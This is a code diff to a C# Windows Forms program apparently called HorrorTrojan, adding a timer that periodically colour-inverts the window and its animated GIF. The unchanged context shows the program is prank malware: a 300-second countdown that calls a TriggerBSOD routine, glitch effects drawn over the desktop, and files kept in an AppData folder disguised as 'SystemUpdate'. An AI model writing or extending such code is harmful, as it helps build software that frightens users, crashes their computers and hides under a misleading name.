@@ -1,5 +1,6 @@
 using System;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -38,16 +39,20 @@ namespace HorrorTrojan
         private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer videoTimer = new System.Windows.Forms.Timer();
+        private System.Windows.Forms.Timer formInvertTimer = new System.Windows.Forms.Timer();
 
         private int timeLeft = 300;
         private bool isGlitchActive = false;
         private bool isVideoActive = false;
+        private bool isFormInverted = false;
         private Random rnd = new Random();
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private Image gifImage;
+        private Image originalGifImage;
         private WindowsMediaPlayer musicPlayer;
         private bool isDragging = false;
         private Point dragStartPoint;
+        private Color originalBackColor;
 
         private string[] videoFiles = { "vd.gif", "kj.gif", "kf.gif" };
 
@@ -55,8 +60,8 @@ namespace HorrorTrojan
         {
             InitializeComponent();
             this.Load += MainInterface_Load;
+            originalBackColor = this.BackColor;
 
-            // ПОДПИСКА НА СОБЫТИЯ ПЕРЕМЕЩЕНИЯ
             this.MouseDown += MainInterface_MouseDown;
             this.MouseMove += MainInterface_MouseMove;
             this.MouseUp += MainInterface_MouseUp;
@@ -138,7 +143,8 @@ namespace HorrorTrojan
                 string gifPath = Path.Combine(appDataPath, "hr.gif");
                 if (File.Exists(gifPath))
                 {
-                    gifImage = Image.FromFile(gifPath);
+                    originalGifImage = Image.FromFile(gifPath);
+                    gifImage = (Image)originalGifImage.Clone();
                     this.pictureBox.Image = gifImage;
                     this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                     ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
@@ -177,15 +183,105 @@ namespace HorrorTrojan
             mainTimer.Tick += MainTimer_Tick;
             mainTimer.Start();
 
-            // GDI ЭФФЕКТЫ КАЖДЫЕ 3-8 СЕКУНД
             glitchTimer.Interval = rnd.Next(3000, 8000);
             glitchTimer.Tick += GlitchTimer_Tick;
             glitchTimer.Start();
 
-            // ВИДЕО КАЖДЫЕ 30-60 СЕКУНД (РЕЖЕ)
             videoTimer.Interval = rnd.Next(30000, 60000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
+
+            formInvertTimer.Interval = rnd.Next(10000, 20000);
+            formInvertTimer.Tick += FormInvertTimer_Tick;
+            formInvertTimer.Start();
+        }
+
+        private void FormInvertTimer_Tick(object sender, EventArgs e)
+        {
+            if (!isVideoActive && !isGlitchActive)
+            {
+                InvertForm();
+                formInvertTimer.Interval = rnd.Next(10000, 20000);
+            }
+        }
+
+        private void InvertForm()
+        {
+            try
+            {
+                if (isFormInverted)
+                {
+                    // Возвращаем нормальные цвета
+                    this.BackColor = originalBackColor;
+                    this.pictureBox.BackColor = Color.Black;
+                    this.bottomPanel.BackColor = Color.Black;
+                    this.timerLabel.BackColor = Color.Black;
+                    this.timerLabel.ForeColor = Color.Red;
+                    
+                    // Возвращаем оригинальный GIF
+                    if (originalGifImage != null)
+                    {
+                        ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
+                        gifImage = (Image)originalGifImage.Clone();
+                        this.pictureBox.Image = gifImage;
+                        ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
+                    }
+                    
+                    isFormInverted = false;
+                }
+                else
+                {
+                    // Инвертируем цвета формы
+                    this.BackColor = Color.White;
+                    this.pictureBox.BackColor = Color.White;
+                    this.bottomPanel.BackColor = Color.White;
+                    this.timerLabel.BackColor = Color.White;
+                    this.timerLabel.ForeColor = Color.Cyan;
+                    
+                    // Инвертируем GIF
+                    if (gifImage != null)
+                    {
+                        ImageAnimator.StopAnimate(gifImage, (s, ev) => { });
+                        gifImage = InvertImage((Image)gifImage.Clone());
+                        this.pictureBox.Image = gifImage;
+                        ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
+                    }
+                    
+                    isFormInverted = true;
+                }
+            }
+            catch { }
+        }
+
+        private Image InvertImage(Image original)
+        {
+            try
+            {
+                Bitmap bmp = new Bitmap(original.Width, original.Height);
+                using (Graphics g = Graphics.FromImage(bmp))
+                {
+                    // Создаем ColorMatrix для инверсии
+                    ColorMatrix colorMatrix = new ColorMatrix(new float[][]
+                    {
+                        new float[] {-1, 0, 0, 0, 0},
+                        new float[] {0, -1, 0, 0, 0},
+                        new float[] {0, 0, -1, 0, 0},
+                        new float[] {0, 0, 0, 1, 0},
+                        new float[] {1, 1, 1, 0, 1}
+                    });
+                    
+                    ImageAttributes attributes = new ImageAttributes();
+                    attributes.SetColorMatrix(colorMatrix);
+                    
+                    g.DrawImage(original, new Rectangle(0, 0, original.Width, original.Height), 
+                                0, 0, original.Width, original.Height, GraphicsUnit.Pixel, attributes);
+                }
+                return bmp;
+            }
+            catch
+            {
+                return original;
+            }
         }
 
         private void MainTimer_Tick(object sender, EventArgs e)
@@ -202,6 +298,7 @@ namespace HorrorTrojan
                 mainTimer.Stop();
                 glitchTimer.Stop();
                 videoTimer.Stop();
+                formInvertTimer.Stop();
                 TriggerBSOD();
             }
         }
@@ -239,7 +336,6 @@ namespace HorrorTrojan
                 {
                     try
                     {
-                        // 50 итераций = 5 секунд (оптимально)
                         for (int i = 0; i < 150; i++)
                         {
                             IntPtr hwnd = GetDesktopWindow();
@@ -433,7 +529,9 @@ namespace HorrorTrojan
                 mainTimer?.Dispose();
                 glitchTimer?.Dispose();
                 videoTimer?.Dispose();
+                formInvertTimer?.Dispose();
                 gifImage?.Dispose();
+                originalGifImage?.Dispose();
                 try { musicPlayer?.close(); } catch { }
             }
             base.Dispose(disposing);
